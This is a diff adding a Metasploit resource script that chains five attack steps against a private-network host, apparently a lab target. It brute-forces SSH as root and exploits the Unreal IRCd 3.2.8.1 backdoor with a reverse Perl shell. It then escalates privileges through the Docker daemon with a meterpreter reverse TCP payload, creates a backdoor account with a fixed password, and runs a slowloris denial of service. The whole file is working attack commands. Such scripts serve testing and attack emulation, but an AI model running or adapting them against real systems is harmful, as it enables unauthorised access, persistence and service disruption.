@@ -1,0 +1,58 @@
+# ============================================================
+# STEP 1 - SSH Brute Force
+# ============================================================
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.56.181
+set RPORT 22
+set USERNAME root
+set PASS_FILE /home/ahnafrr/Desktop/msf/unix_passwords_modified.txt
+run
+
+# ============================================================
+# STEP 2 - Unreal IRCd 3281 Backdoor
+# ============================================================
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set PAYLOAD cmd/unix/reverse_perl
+set LHOST 192.168.56.191
+set LPORT 4444
+set RHOSTS 192.168.56.181
+set RPORT 6697
+exploit -z
+
+# ============================================================
+# STEP 3 - Docker Daemon Privilege Escalation 1
+# ============================================================
+
+use exploit/linux/local/docker_daemon_privilege_escalation
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set SESSION 1
+set LHOST 192.168.56.191
+set LPORT 4444
+set PayloadLinuxMinKernel 3.17
+exploit -j -z
+# set ForceExploit true (use if necessary)
+
+# ============================================================
+# STEP 4 - Docker Daemon Privilege Escalation 2
+# ============================================================
+
+use exploit/linux/local/docker_daemon_privilege_escalation
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set SESSION 1
+set LHOST 192.168.56.191
+set LPORT 4444
+set PayloadLinuxMinKernel 3.17
+exploit -j -z
+# set ForceExploit true (use if necessary)
+
+sessions -i
+useradd -p "$(openssl passwd -1 password)" cremetest
+
+# ============================================================
+# STEP 5 - End Point DOS
+# ============================================================
+
+chmod +x local_slowloris.py
+timeout 60s ./local_slowloris.py &
